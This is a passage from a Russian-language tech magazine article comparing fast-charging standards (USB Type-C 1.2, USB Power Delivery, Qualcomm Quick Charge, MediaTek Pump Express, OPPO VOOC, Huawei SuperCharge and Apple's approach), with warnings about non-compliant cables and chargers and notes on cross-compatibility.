тически невоз можным для независимых китайских производителей стал
выпуск шнурков, корректно идентифицируемых с помощью микросхем элек‐
тронного мар кера (e‐marker chip). Вот детальный раз бор одного из таких
кабелей (поверь, дос таточно типич ного).
  Оставим маркеры пассивной идентификации кабеля в стороне,  так
как нап рямую с переда чей заряда они не свя заны, и рассмотрим пос леднюю
категорию кабелей: ту, что оборудована разъемом USB‐C на одном конце
и при вычным USB‐A на другом.





Инженер Google Бенсон Люн протестировал несколько десятков кабелей,
переходников и зарядных устройств с разъема ми USB Type‐C и свел все дан‐
ные в пос тоянно обновляемую таблицу. Ознакомься, а лучше — сохрани
ссылку, это действи тельно важный и авторитет ный источник информа ции.
  Наиболее типичной проблемой для китайских про изво дителей ста ло
использование резистора со значением сопротивления 10 кОм вместо уста‐
новленных в спе цифи кации 56 кОм. На такой шаг недобросовестные про‐
изводители идут впол не сознательно: если смар тфон (или другое устройство)
с  разъемом USB  Type‐C  уви дит  кор ректное  значение  сопротивления
в 56 кОм, оно огра ничит максимально пот ребляемый ток мак симально допус‐
тимым для порта USB‐A зна чением (как мы помним, это сов сем немного).
Исполь зование резистора на 22 кОм даст воз можность передачи до 1,5 А,
что еще условно допус тимо. А вот использование резистора в 10 кОм
или меньше сооб щит устрой ству, что «на дру гом конце все хорошо, можно
брать до 3 А».
   Что при этом может случиться с устройством «на другом конце»? Да все
что угодно, от прос той заряд ки с понижен ной максимальной мощ ностью
до выхода из строя заряд ного устройства (или порта компьютера/ноутбука).
Если в зарядном устройстве отсутс тву ет защита (типично для дешевых
зарядок), возможен его перег рев или воз горание. Под робное описание
проблемы с кар тинка ми.
   Эта проблема касается не только шнур ков, которые ты можешь купить
на Aliexpress или Amazon. Такой «неправильный» кабель вхо дит в комплект
OnePlus 2. После того как проб лема вскры лась, компания OnePlus отреаги‐
ровала: «Не беспокойтесь, НАШ смартфон  этот шнурок не повредит.
На остальных — пле вать». Так что если ты не хочешь пополнить ряды тех,
на кого «плевать», — под ходи к выбору кабеля с большой осторожностью.
И даже если здесь и сей час у тебя устройство, способное «проглотить» неп‐
равильный кабель, то где гаран тия, что зав тра у тебя или чле на тво ей семьи
не появит ся смартфон, работа ющий в точном соответс твии со спецификаци‐
ей? Луч ше не рис ковать.


USB POWER DELIVERY (USB PD)
USB Power Delivery (USB PD) — открытый стандарт, опубликованный USB‐IF
и описывающий передачу питания между устройствами, оборудован ными
пор тами USB Type‐C. Именно передачу питания, а не зарядку: одно и то же
устройство в любой момент времени может выступать как донором (заряд‐
ным устройством), так и акцепто ром (тем, кого заряжают). Появился этот
стандарт на год позднее Quick Charge 2.0, а начало его массового исполь‐
зования совпало с выходом поколения чип сетов Qualcomm 808/810.
  На сегодняшний день существу ет три поколения стандарта: USB PD, PD
2.0 и PD 3.0. И если первое поколение описыва ло дос таточ но жесткие про‐
фили заряда, то уже во второй версии стандарта профили были заменены
на «правила» и у произво дителей появи лось гораздо боль ше сво боды.
Разитель ных различий между вто рым и треть им поколе ниями нет, а USB‐IF
и вов се опи сывает толь ко общий стандарт USB Power Delivery. Различия меж‐
ду поколениями в таких, к при меру, тонкостях, как возможность продолжать
неп рерыв ный обмен данными в момент сме ны ролей устройств (с приема
заряда на передачу и обратно). Не будем делать раз личий между поколе‐
ниями USB PD и мы.
   Вот табличка‐сравнение официальных спецификаций USB‐IF:


 Спе цифи-     Макс. нап-       Макс. сила     Макс. мощ-
 кация        ряжение         тока           ность

 USB 2.0        5 V               500 mA            2.5 W

 USB 3.0 / 3.1    5 V               900 mA            4.5 W

 USB BC 1.2     5 V                  1.5 A               7.5 W

 USB Type‐C
                5 V               3 A              15 W
  1.2

 USB PD 3.0     20 V              5 A             100 W

Как видим, в спецификации USB PD все сов сем неп лохо. И если USB Type‐C
(1.2) без поддержки USB PD дает нам максимальную мощность в 15 Вт
при напряжении 5 В и силе тока 3 А, то это го может ока заться вполне дос‐
таточно для большинства смартфонов без необ ходимос ти встраивать под‐
держку более сложного стандарта USB PD. А вот для планшетов (к при меру,
Apple iPad Pro 12.9 или нового iPad Pro 10.5) и боль шинства уль трабуков (мно‐
гие модели Dell, HP, все современные Apple MacBook и дру гие) уже нужна
под держка как минимум USB PD  2.0 с соответствующими адаптерами
питания.
   Вот, к при меру, какие варианты зарядок допускает новая спе цифи кация.





QUALCOMM QUICK CHARGE 3.0
Стан дарт Qualcomm Quick Charge 3.0 массово вышел на сце ну в 2016 году
с появлени ем про цессоров Qualcomm 820/821. Точно так же, как «холодный»
Snapdragon 820 стал «работой над ошиб ками» по сравнению с перегрева‐
ющи мися и про жорливыми Snapdragon  810, так и при работе над QC
3.0 инженеры сконцентрировали усилия на продлении срока службы акку‐
мулятора, заряжая его в более щадящих режимах без боль шого проседания
скорос ти заряда.
   Если в рекламе QC 2.0 ком пания делала упор на том, насколь ко быс трее
заряжаются устрой ства в сравнении с QC 1.0, то, презентуя QC 3.0, под‐
черкивала, насколь ко эффективнее (с меньшими потеря ми и нагревом) идет
зарядка. Снижение неп родуктивных потерь и сопутствующего нагрева, а так‐
же дополнительный контроль температурных режимов, в свою очередь, поз‐
волили ускорить и сам процесс.





В отличие от QC 2.0, в котором напряжение выбиралось из ряда 5, 9, 12 В,
в QC 3.0 нап ряжение может менять ся гранулярно с шагом всего 0,2 В, а дос‐
тупный диапазон нап ряжений расширен до 3,6–20 В (чаще все го исполь зует‐
ся диапазон 5–12 В). Максимальная мощность в сравнении с предыдущей
версией осталась неиз менной на уровне 18 Вт.
  В целом QC 3.0 мож но только похвалить. Если про изводитель не гонится
за цифрами, завышая скорость заряд ки в ущерб ресурсу аккумулятора (такие
при меры нам извес тны — взять тот же LeEco Le Pro 3), то использование QC
3.0 пред лага ет дос таточно щадящий режим заряда, который вре дит акку‐
мулятору значительно меньше, чем QC 2.0.
  Мож но ли рекомендовать зарядное устройство с QC 3.0 для ежед невно го
(или еже нощного) использования с точ ки зрения жизненно го цикла акку муля‐
тора? Если ставить телефон на зарядку на всю ночь, то исполь зование стан‐
дартных ЗУ с током 2,4 А, воз можно, продлит ресурс батарейки, и через пол‐
тора‐два года падение его емкости будет меньше, чем если бы все это время
ты пользовался заряд кой с QC  3.0. Впрочем, может, и не продлит —
это зависит исключительно от того, как имен но конкретный про изво дитель
нас троил процесс заряда, до каких тем ператур он поз воляет разогреваться
аккумулятору и насколько береж но отно сит ся к его ресурсу.


И ТУТ ПРИШЕЛ ГУГЛ
Все пос ледние смар тфо ны Google, выпущен ные в 2015 и 2016 годах, исполь‐
зуют стандарт быстрой зарядки согласно спецификации USB Type‐C 1.2 (5 В /
3 А). При этом как Nexus 5X, так и Nexus 6P оборудованы всем необходимым
для быстрой зарядки по протоколу QC 2.0 — воз можность использования
которого была сознательно заб локирована Google.
   Те перь офи циальная позиция Google заключа ется в том, что повышение
нап ряжения во вре мя заряда смартфонов — зло, и производителям рекомен‐
дует ся отказаться от проприетар ных методов быс трой зарядки и исполь‐
зовать вместо это го заряд ку по стан дарту USB Power Delivery. Вот выдержка
из Android Compatibility Deﬁnition Document:
   «Для устройств с под держкой Type‐C УСИЛЕН НО РЕКОМЕН ДУЕТ СЯ отка‐
заться от под держки проп риетарных методов заряда, которые под нимают
нап ряжение Vbus выше стандартного, а также изме няют роли донора/
акцепто ра, потому что такие модифи кации могут повлечь проблемы с сов‐
местимостью между устрой ствами и адаптерами питания, под держивающими
стандартные методы USB Power Delivery. Пока мы УСИ ЛЕН НО РЕКОМЕН‐
ДУЕМ данный подход, но в будущих версиях Android мы можем ПОТ‐
РЕБОВАТЬ от всех устройств, оборудо ванных портами type‐C, поддержку
пол ной сов местимости со стан дартны ми адаптерами питания type‐C».


А ЗА НИМ ПРИШЛИ КИТАЙЦЫ
И что, сто ило Google рекомендовать стандартизировать процесс заряда,
как сразу все ста ло хорошо? Не спеши, ведь китайские производите ли спо‐
соб ны  испортить любую хорошую  идею. Помнишь, мы  рас сказывали
про инженера Google Бенсона Люна? Кроме кабелей USB‐C, он протес‐
тировал и несколько заряд ных устрой ств, декларирующих сов мести мость
со стандартом USB PD. Результаты были неутешительные: из всех протес‐
тированных стандарту не соответствовало ни одно. Вот как это выглядит:
   «Зарядное устройство не соот ветс твует спе цификации USB Type‐C Re‐
lease  1.2,  нарушая  Section  4.5.2.2.6.1  Unattached.SRC  Requirements,
в которой изло жено требова ние: „Порт должен обеспечивать раздель ную
ком мутацию Rp на выводах CC1 и CC2 согласно таблице 4‐15“. <...> Про‐
изводитель закоро тил выводы СС, сэкономив на резисторе».
  В результате копе ечной экономии (доли цен та!) кабели, оснащен ные мар‐
кером идентификации, будут с таким заряд ным устройством работать некор‐
ректно. Отсюда и негативные отзы вы покупа телей таких блоков питания: нап‐
ример, MacBook 2015 года заряжа ет, а 2016‐го — уже нет.
  Безусловно, открытый стандарт — это хорошо. Но слышал ли ты ког‐
да‐нибудь о массовых проб лемах ЗУ с поддер жкой, скажем, Qualcomm QC
3.0? За исклю чением брака в отдель ных экземплярах — нет, массовых проб‐
лем с Quick Charge за все годы так и не обнаружилось. Почему? Потому что
Qualcomm не толь ко лицензирует свою технологию, но и следит за тем, чтобы
ее корректно использовали, сертифицируя устройства.
   Если китайский произво дитель попыта ется выпус тить зарядное устрой‐
ство с Quick Charge, не соответс твующее спецификациям Qualcomm, он
не только не получит сертифика та, но и не сможет продавать такое устрой‐
ство. А вот игно рировать, использовать или нарушать открытый стандарт
можно совершенно спокойно: никто никого не кон тролиру ет, не проверя ет
и не сертифици рует. Так что ждет нас очередная вол на условно совмести мых
устройств и бло ков питания, несмотря на все старания Google.


                                     Продолжение статьи →
X‐MOBILE              ← НАЧАЛО СТАТЬИ





           СТАНДАРТЫ, ОСОБЕННОСТИ И
             ПРОБЛЕМЫ ТЕХНОЛОГИЙ
                 БЫСТРОЙ ЗАРЯДКИ





ЖИЗНЬ В ПАРАЛЛЕЛЬНОЙ ВСЕЛЕННОЙ: MEDIATEK PUMP
EXPRESS+
Технология MediaTek Pump Express+ заслужива ет отдельного разговора.
  Компания MediaTek известна своими недорогими чипсетами, на которых
соб раны без пре уве личения тысячи моделей устройств. Самым рас простра‐
ненным решени ем MTK до сих пор остаются вари ации чипсетов, основанных
на использовании восьми маломощных процессорных ядер ARM Cortex A53.
Но даже смар тфо ны на таких откро венно посредственных чипсетах зачастую
обо рудуются схе мой быстрой заряд ки.
  Для начала взгляни на таб личку.





Ни чего не напоми нает? Каждое поколение тех нологии MediaTek Pump Ex‐
press+ име ет прямое соответствие в лице Qualcomm Quick Charge. Так, Pump
Express+ первого поколения обла дает теми же свой ствами и характерис‐
тиками, что и QC 2.0 (плюс предлагает воз можность парал лельной заряд ки
банок аккумулятора, которой на нашей памяти так никто и не вос поль зовал‐
ся). PE+ 2.0 приблизительно соответс твует уровню QC 3.0, уменьшая гра‐
нулярность шага нап ряжения до 0,5 В.
  Наконец, в самой сво ей интерес ной реали зации PE+ 3.0 призван кон‐
куриро вать с Quick Charge 4.0+. Эта вер сия стан дарта была анонсирована
в мае 2016‐го, но так до сих пор и не вошла ни в один реально существующий
смар тфон. В отличие от QC 4.0 и более ранних вер сий Pump Express+, пос‐
ледняя вер сия PE+ 4.0 резко сни жает напряжение в цепи заряда. И если PE+
2.0 пред лагал произво дителям выбор из ряда зна чений напряжения до 20 В,
то PE+ 3.0 ограничи вается отрезком от 3 до 6 В с шагом в 10–20 мВ. Так же
пол ностью изменен протокол коммуника ции меж ду устройством и адаптером
питания: теперь вместо модуляции Vbus используется стандартный протокол
USB PD.
   Кстати, а что тут будет с обратной сов местимостью с ран ними вер сиями
PE+? Согласно официальному FAQ — сов сем ничего; пожалуй, это даже неп‐
лохо — пусть наконец несовместимые стандарты вымрут. Впро чем, надежды
на это мало: MediaTek заявляет, что стандарты PE+ 2.0 и 3.0 будут сущес тво‐
вать параллельно и уста навливать ся в устройства по тре бованию OEM.




Су ществуют зарядки‐гиб риды, которые могут заряжать телефоны и с QC 3.0,
и с Pump Express+ 2.0. Вот пример: зарядное устрой ство от смартфонов
LeEco (моделей Le 2, Le Max 2, Le Pro 3) поддержи вает оба стандарта. Так
получи лось потому, что модельный ряд компании включает смартфоны
на чипах и Qualcomm (SD652, SD820/821), и MediaTek (MTK Helio x20, x23,
x25), и с точки зре ния логистики компании оказалось дешев ле класть
в коробку единственную модель зарядного устройства, которая производится
в массовых количествах.


Ты еще не запутался? Нет? Что ж, добавим ада!


OPPO VOOC, ОН ЖЕ ONEPLUS DASH CHARGE
Что ж, приш ло вре мя рас смотреть стандарт VOOC, он же DASH Charge,
по которому заряжается «убий ца флагманов» последне го поколе ния, OnePlus
5, и все его предшественники, а так же многие смартфоны китай ского про‐
изводителя OPPO независимо от используемо го чипсета. Если тебе кажется,
что OnePlus и OPPO занимают мар гинальную нишу и о них не стоит говорить
под робно, а разве что упомянуть, посмотри вот на эту табличку:


 Ком-    Объ ем поставок (млн шт.), I    До ля рын ка (%), I кв.
 пания    кв. 2017                    2017

 Sam‐
            79,2                           22,8%
 sung

 Apple      51,6                             14,9%

 Huawei    34,2                           9,8%

 OPPO     25,6                             7,4%

  vivo        18,1                            5,2%

 Другие    138,7                           39,9%

 Все го     347,4                           100,0%

Несмотря на то что OPPO и Vivo при над лежат кон церну BBK Electronics, ком‐
пания исполь зует собственную технологию быстрой зарядки VOOC только
в смартфо нах под тор говыми марками OPPO и OnePlus. Но и 7,4% от все го
рынка — это немало.
   Есть неплохой, хоть и очень поверхностный об зор — сравнение скорос ти
зарядки с участием VOOC. Мы же отме тим следующие моменты.
   Тех нология VOOC появилась в 2014 году в смартфонах OPPO Find 7, а так‐
же устрой ствах серий F, N и R. В отличие от основного конкурента, Qualcomm
QC 2.0, тех нология OPPO основана не на повышении напряжения, а на
подаче более высокого тока — до 4 А. Суть тех нологии состоит в параллель‐
ном заряде двух банок аккумулятора, что позволя ет сократить вре мя заряда,
не перегревая при этом аккумулятор. Кро ме того, некоторые цепи, контро‐
лирующие про цесс заряда, были перенесены из контроллера питания смар‐
тфона в зарядное устрой ство, что, по завере ниям производителя, частично
переносит теп лоотдачу из встро енного в телефон контрол лера во внешнее
ЗУ благодаря технологии прямого заряда.





По ка звучит неп лохо? Да нет, уже воз ника ет воп рос. Даже если брать лишь
то, что изложено на бумаге, сра зу заметна как минимум одна проблема:
защиту и контроль заряда категоричес ки нель зя пол ностью «перено сить»
из телефона в ЗУ; мож но и нужно дублировать защитные механизмы. В про‐
тив ном случае... а давай посмотрим, что получа ется в противном слу чае.
   Разработ чики OPPO прекрасно знают, что перенос части контроль‐
но‐защитных механизмов из смар тфо на наружу, в зарядное устройство, рез‐
ко снижает планку запаса прочности. Более‐менее безопас но такая тех‐
нология будет работать в том и только в том случае, если мы пол ностью уве‐
рены в качестве всех компонен тов цепочки. Пот ребуется исключительно
качественное ЗУ, исключительно качественная химия акку муляторов и про‐
веренный USB‐кабель, способный гарантирован но передавать ток в 4 А.
Понятно, что отдать кон троль над производством зарядок и шнурков на сто‐
рону никак нельзя: попыт ка подать ток в 4 А на обычный кабель с разъ емом
USB‐A на одном конце (а именно такие, а вовсе не Type‐C → Type‐C кабели
используются OPPO) с гарантией приведет к опасному перегреву не рассчи‐
танного на такой ток разъема.
   Так что — назад, от миллиона стандартных аксессуаров — к проприетар‐
ным кабелям USB, без которых «магия» быс трой заряд ки работать не будет!
И если в OPPO Find 7 для заряд ки исполь зовался разъ ем microUSB с удли‐
ненным штекером и уве личенным числом кон тактов (кстати, этот кабель был
про должением заряд ного устрой ства, отдельно его купить было нельзя), то
в ком плек те с OnePlus 5 кла дут непримеча тельную USB‐заряд ку и обычный
с виду шнур с USB‐C на одном конце и USB‐A на другом.
  Обычные они толь ко с виду. Кабели OnePlus выполнены с грубыми
наруше ниями стандарта USB Type‐C  1.2; их небезо пасно использовать
для зарядки других гаджетов (об этом, как и о реакции компании, мы уже
писали выше). Но если ты хочешь, чтобы твой телефон OPPO или OnePlus
заряжался с мак симальной скоростью по стан дарту VOOC/DASH Charge, то
будь добр исполь зовать только ком плектную зарядку и только комплектный
кабель. Хочешь быструю зарядку на работе, в машине или в поез дке от внеш‐
него аккумулятора? Ни одно из существующих зарядных устрой ств тебе
не поможет: будь добр при обрести дополнительный комплект ЗУ + кабель
про изводства OPPO. И не забудь: использовать тот же кабель для зарядки
других устройств может быть чревато.
  А что будет, если ты все‐таки попытаешься зарядить смар тфон от OPPO
или OnePlus сто ронней заряд кой или от «родного» ЗУ, но другим кабелем?
Не сго рит, будет заряжаться, но очень и очень мед ленно. Максимальный ток
заряда, который телефон примет от стан дартных шнурков и зарядок с USB‐
C, — все го 1,5 А (может варьиро ваться в зависи мости от устройства; данные
от OnePlus 5). Snapdragon 835? QuickCharge 4.0 с максимально широкой сов‐
местимостью и поддер жкой открытого стан дарта USB‐IF Power Delivery? Нет,
не слы шали.
   Та ким образом, с нашей колокольни основное отли чие  технологии
VOOC/DASH Charge от конкурен тов — в грубых наруше ниях стандартов USB‐
IF и максималь ной несовмести мости всего со всем (причем в обе стороны).
Достоинства технологии — дос таточно высокая ско рость заряд ки и отно‐
сительно неболь шой перег рев — прос то теря ются на фоне тотальной несов‐
местимости с существующими аксессуарами и потенциальной опас ности,
связанной с переносом некото рых цепей из телефо на в ЗУ.


HUAWEI SUPERCHARGE
Чуть выше мы уже писали о Huawei FCP (Fast Charge Protocol), работа ющем
при 9 В / 2 А. Так вот, это — не оно; SuperCharge — очередной ни с чем
не совмести мый про токол быстрой зарядки, поддержи ваемый единственным,
хоть и крупным произво дителем.
  В опи сании тех нологии SuperCharge от Huawei мы ограничимся ука зани ем
нап ряжения и силы тока — это 4,5 В / 5 А — и тем, что для быстрой зарядки
пот ребуется проприетарный кабель. Мыс ли по этому поводу смотри в пре‐
дыдущей главе. Это го будет дос таточно, а потенциальные достоинства тех‐
нологии от Huawei мы оставим там же, где находятся потенциаль ные дос‐
тоинс тва процессоров Kirin в сравнении с аналогами от Qualcomm.
   Если на этом месте тебе уже захоте лось отс тре лить пару‐трой ку произво‐
дителей, подобно кро ликам плодящих несовместимые друг с другом фор‐
маты быс трых зарядок, — потерпи, осталось нем ного.


APPLE
Несколь ко особняком стоит компания Apple с ее линей ками iPhone, iPad
и MacBook. Здесь, к сожалению, дела обсто ят также не очень просто — но тут
хотя бы мож но разобраться.
   Итак, пер вое: в смартфонах iPhone быстрой зарядки нет. Компания Apple
заботит ся о сво их поль зователях, и заряжать iPhone можно от любых качес‐
твен ных зарядных устройств, совместимых с любым стандартом быс трой
зарядки. Только заряжаться iPhone все равно будет медленно. Как видим,
здесь все прос то. Ну, разве что iPhone 6s Plus и 7 Plus могут потреблять чуть
более высокий ток, если их подклю чить к ЗУ от iPad, но быс трой зарядкой
здесь даже не пахнет.
   Вто рое: в последних поколениях MacBook, вклю чая модели Pro, заряд ка
ведется в пол ном, бук вальном и доскональном соот ветс твии стандарту USB
PD 2.0. У тебя есть зарядка PD от Dell, HP или Xiaomi, под держивающая соот‐
ветствующие правила? MacBook будет заряжать ся с правильной скоростью.
  И третье: план шеты iPad быстрой заряд ки не име ют, iPad Pro 9.7 — тоже
нет, а вот iPad Pro 12.9 (обе модели, 2015 и 2017 года) и iPad Pro 10.5 под‐
держивают   стан дарт  быстрой   заряд ки  USB  PD   2.0  по   про‐
филю 14,5 В при 2 А (максимальная мощ ность 29 Вт). Измерения под‐
твержда ют как факт быстрого заряда, так и параметры силы тока и нап‐
ряжения.





Поз воль те, а где же подвох? Ведь не может у Apple обойтись без подвоха!
И он есть: для того чтобы заряжать iPad Pro 12.9 или 10.5 с мак сималь ной
скоростью (гру бо говоря — за полтора часа вместо пяти на комплектном ЗУ),
тебе пот ребуется купить дополнительно совместимый с USB PD 2.0 адаптер
питания  (разуме ется,  Apple  рекомендует  собс твенный,  от  MacBook
за 65 евро, но и адаптер от Xiaomi стоимостью 15 евро мы так же протес‐
тировали, и он прекрасно сра ботал).
  Но это не все: чтобы пош ла быс трая заряд ка, тебе потребуется фир‐
менный кабель от Apple с разъемом USB‐C с одной стороны и Lightning —
с другой. Сто имость такого кабеля — 29 евро, и сэкономить не получит ся:
все про тестированные нами подобные кабели с Aliexpress прекрасно заряжа‐
ют iPhone и iPad, но быстрая зарядка не работа ет. Связано это с тем, что
кабели USB‐C в программу MFi‐сертификации от Apple не входят, так что
единственный полностью совместимый кабель производит исключительно
Apple.


БУДУЩЕЕ НЕ ЗА ГОРАМИ: QUICK CHARGE 4.0 И 4.0+
По хоже, успе хи USB‐IF на ниве стандарти зации процесса заряд ки начинают
при носить свои плоды, и последние версии Qualcomm  Quick Charge
4.0 и 4.0+ осно вываются именно на стандарте USB Power Delivery, расширяя
и детализируя его в нужных местах. Важно здесь даже не то, что QC 4.0 дол‐
жен стать «еще быстрее» или «еще эффектив нее» по сравнению с предшес‐
твен ником.





Ог ромное значение имеет совмести мость с существующим пар ком заряд ных
устройств: телефо ны с Quick Charge 4.0 смо гут получить максимальную мощ‐
ность как от зарядных устройств QC 3.0, так и от USB Type‐C 1.2 и USB PD.
  Кроме того, QC 4.0 наконец получил воз можность опре делять качество
кабеля (счи тыва нием пассивно го маркера иден тификации по стандарту USB
PD) и подавать более высокий ток при понижен ном напряжении при исполь‐
зовании кабелей, соответству ющих стан дартам Power Delivery. Впрочем, этот
момент — заслуга стандарта USB PD, а не ком пании Qualcomm.





Навер ное, основным отличием QC 4.0+ от «прос то» QC 4.0 стала воз‐
можность (опци ональная) для произво дителей исполь зовать для заряда акку‐
мулятора две параллельные линии.
  Обрати вни мание, на этом официальном слайде с презентации Qualcomm
нарисована поддержка Dual Charge и у предыду щего стандарта QC 3.0. Нам
не попадалось ни одного устрой ства с QC 3.0, оснащенного данной тех‐
нологией.





По добную схе му уже дав но использует OPPO в сво ем стандарте VOOC. Дей‐
ствительно, параллельная подача более низкого тока на две отдельные банки
аккумулятора способна и зарядить быс трее, и уменьшить нагрев. Как ни пос‐
мотри — сплош ные плю сы. Минус —  от про изводите лей потребу ется
еще более тщательный контроль за качес твом банок аккумуляторов, а сами
аккумуляторы при дется оснащать большим чис лом контактов; схе ма зарядки
и питания устройства еще усложнится.





К сожале нию, судьба нового стандарта пока достаточ но смутная. QC 4.0 был
анон сирован даже  чуть раньше выхода на рынок чипсета Snapdragon
835 и должен был войти в смартфо ны, работающие под управлением этого
чип сета. Но ни в аме риканской версии Samsung Galaxy S8, ни в Xiaomi Mi6,
ни в Motorola Moto Z2 Force, ни тем более в OnePlus 5 ничего подобного
не наб людается. Единственный на сегодня смартфон, поддерживающий QC
4.0+ (сразу с «плюсом»), — Nubia Z17. Одна маленькая проблема: в природе
не существует зарядных устройств с поддер жкой QC 4.0, так что в коробку
положи ли зарядку на «ста ром» стандарте QC 3.0.
   Спустя полгода с начала про даж телефо нов на SD 835 зарядных устрой ств
с QC 4.0 так и не появи лось. Ситу ация выг лядит странно и, прямо скажем,
совершенно идиотским образом.




Cуществует по край ней мере один адаптер питания, одновре менно под‐
держивающий стандарты USB Type‐C 1.2, USB PD 2.0 и Qualcomm QC
3.0 на единствен ном разъеме USB Type‐C.





                  Блок питания производс тва Xiaomi

Этот адаптер быстро заряжает все: ноутбуки Dell и HP (смотри на мощность
оригиналь ного  адап тера),  Apple  MacBook, смар тфоны  Moto  Z,  Lumia
950 и 950XL, а так же устройства с Quick Charge 3.0 (проверили, работа ет).
Более того, с соответс твующим кабелем USB‐C → Lightning за полтора часа
заряжается и iPad Pro 12.9. Единс твенное устройство, которое «не завелось»
от это го адаптера, — смартфон Gigaset ME, а OnePlus 5 способен взять
от адаптера не более 1,5 А при напряжении 5 В.



       ↔
Что будет, если под клю чить телефон с QC 3.0 к зарядному устрой ству с под‐
держкой QC 2.0? Получит ся быстрая заряд ка по протоколу QC 2.0, но с боль‐
шинством защитных механизмов от QC 3.0 (то есть акку мулятор не дол жен
будет перегреваться так силь но, как он перег ревался бы, если бы в телефоне
стоял контрол лер от QC 2.0). В целом будет чуть мед леннее и чуть горячее,
чем если бы ты исполь зовал зарядное устройство с QC 3.0.
  А если, наобо рот, телефон с QC 2.0 подключить к зарядке с QC 3.0?
Эффект будет полностью аналогичен использованию QC 2.0 на обоих концах:
и перегрев  аккумулятора, и  скорость заряда  будут  точ но такими  же,
как если бы ты использовал пре дыду щее поколе ние заряд ных устрой ств.

        ↔
А если в зарядку с USB PD 2.0 или 3.0 подклю чить смар тфон, поддержи‐
вающий стандарт Qualcomm QC 3.0? Здесь возможны варианты. Некоторые
про изводители пре дус мотрели такую возможность, и их смартфоны возьмут
от зарядного устрой ства максимально допустимую мощность при 5 В / 3 А (на
прак тике обычно чуть мень ше). Другие же будут спокойно заряжаться с силой
тока от 1,5 до 2,4 А. Ничего страшного в любом случае ждать не стоит.
  А если к зарядке QC 3.0 с разъ емом USB‐A подключить устройство, сов‐
местимое с USB‐C 1.2 или USB PD? Здесь воз можны вари анты. Если кабель
«правильный», с резистором на 56 кОм, то беды не слу чится, зарядка пойдет,
но — медленно. Если кабель китайский, с «неп равильным» резистором
на 10 кОм, то устрой ство может попытаться получить 3 А при напряжении 5 В.
В принципе, стандарт QC 3.0 поддерживает и такую комбинацию, и, скорее
все го, больших неп риятностей не будет, но... а что, если устрой ство, как Moto
Z Force, зап росит 5,7 А (это возможно, если нужно зарядить одновре менно
сам телефон и подсоеди нен ный к нему модульный акку мулятор)? Из этого
ничего хороше го не вый дет.
   А, допустим, телефон с QC 2.0 и разъ емом USB‐C — в заряд ное устрой‐
ство от Lumia 950, Pixel или MacBook? В те смут ные вре мена производите ли
сла бо представ ляли, что такое USB Type‐C, поэто му на практике может про‐
изойти все что угодно. В лучшем слу чае телефон будет заряжать ся, хоть
и небыс тро. Однако у нас побывало как минимум два устройства, которые
или «не видят» подключенного ЗУ вообще, или пишут «Power connected: not
charging» (и, соответственно, не заряжа ются).
  Вы яснилось это экспериментально, ког да мы нес коль ко дней пытались
ожи вить разряженный до нуля Gigaset ME Pro, подклю чая его к блоку питания
то от MacBook, то от Pixel. Помогла в конечном итоге обычная «медленная»
зарядка — толь ко ее смартфон согласился распознать. Впос ледствии мы
экспериментально определи ли, что телефон прекрасно заряжа ется от ЗУ
с QC 2 .0, QC 3.0 и «обычных», вклю чая компьютерные порты, но напрочь
отка зывается воспри нимать блоки питания, которые поддерживают новые
спе цификации USB Type‐C 1.2 или USB PD (в том чис ле и гиб ридные, ком‐
бинированные с QC 3.0).

    ↔
Что будет, если к мощ ному адап теру питания USB‐C с поддер жкой USB PD
2.0, скажем от ноутбука HP Spectre x360 или MacBook Pro, подключить смар‐
тфон? Если это Lumia 950, Nexus 5X или 6P, Google Pixel, Motorola Moto Z —
пойдет быстрая заряд ка по протоколу, опи санному в спецификации USB
Type‐C 1.2 (то есть с мак симальной мощ ностью 15 Вт, или 5 В / 3 А). А если,
наобо рот, к зарядке от Lumia 950 под ключить MacBook или ноутбук HP Spec‐
tre x360? Компьютер запросит у зарядного устройства список под держи‐
ваемых правил (комбинаций напряжения и силы тока), не найдет нужных
и либо откажется заряжаться совсем, либо будет заряжаться очень мед‐
ленно.
  А если зарядкой от HP попытаться заряжать MacBook или зарядку от уль‐
трабука Dell XPS 12 под ключить к HP Spectre x360? Произой дет ров но то же
самое: устройство запросит спи сок под держиваемых правил зарядки и, если
най дет совместимую комбинацию, будет заряжаться; не найдет — не будет
или будет, но медленно. К слову, мы протестирова ли ряд комбинаций, выяс‐
нив, что зарядка от MacBook 2015 заряжа ет сам MacBook и смартфоны;
зарядка от Dell XPS 12 — собственно Dell и MacBook, а зарядка от HP Spectre
x360, самая мощная из всех, заряжает все три устройства.



ЗАКЛЮЧЕНИЕ
Технологии быстрой заряд ки эволюционировали парал лель но, прой дя неп‐
ростой путь от первого офи циального стандарта USB‐IF BC 1.2 до пос ледне‐
го поколения USB Power Delivery. Долгое время парал лельно сущес твовав‐
шие стандарты быстрой заряд ки были несовмести мы между собой, и быс тро
зарядить устройство, основан ное на стандарте USB Type‐C 1.2, зарядным
устройством с поддержкой, к примеру, Qualcomm Quick Charge 3.0 не пред‐
став лялось воз можным. Более того, использование случайно взятого кабеля
USB‐C могло привести к печальным последстви ям.
  К счастью, разброд и шатание уходят в прошлое. Похоже, что все
основные стандарты быстрой зарядки от USB‐IF (PD 3.0), Qualcomm (QC 4.0)
и MediaTek (PE+ 3.0) будут основаны на одном и том же протоколе USB Power
Delivery и будут корректно понимать зарядные устройства парал лель ных фор‐
матов. Да, специфи кация USB PD — это только основа, опи сывающая лишь
про токол работы и способы передачи энер гии между устрой ствами. Детали
реали зации —  кон троль  температурного  режима, выбор  оптимальных
парамет ров напряжения и силы тока — оста ются открытыми. Ставка будет
делаться не на ско рость заряда в ущерб все му остальному, а на простоту
и совмести мость реализации, на продление ресур са акку мулятора, на энер‐
гоэф фектив ность самого процес са заряда, уменьшение нагрева и безопас‐
ность процесса.
  Новые стандарты Qualcomm QC 4.0 и MediaTek PE+ 3.0 будут расширени‐
ями спе цифи кации USB Power Delivery 2.0, позволяющими намного точнее
и быс трее регулировать скорость заряда, ток и напряжение. Многие про‐
изводители выберут спецификацию USB PD в чистом виде (как это уже сде‐
лала, нап ример, Motorola в устройствах Moto Z, Z2, Google в смартфоне Pixel),
и это тоже будет отличный выбор — разумеется, если производитель суме ет
самос тоятельно правильно настро ить режимы заряда. Другие предпочтут
вос поль зовать ся готовым решением на осно ве Qualcomm Quick Charge
4.0 или MTK Pump Express+ 3.0, получив как полную совместимость со спе‐
цифи каци ей USB Power Delivery, так и ряд дополнительных преимуществ.
  Мы искренне жела ем стремительной и безболез ненной смерти методам
быстрой зарядки от про изводителей, которые продол жат плодить несов‐
местимые проп риетар ные системы (камень в огород Huawei с их новым стан‐
дартом SuperCharge и кор порации OPPO с их стандартом VOOC, а так же при‐
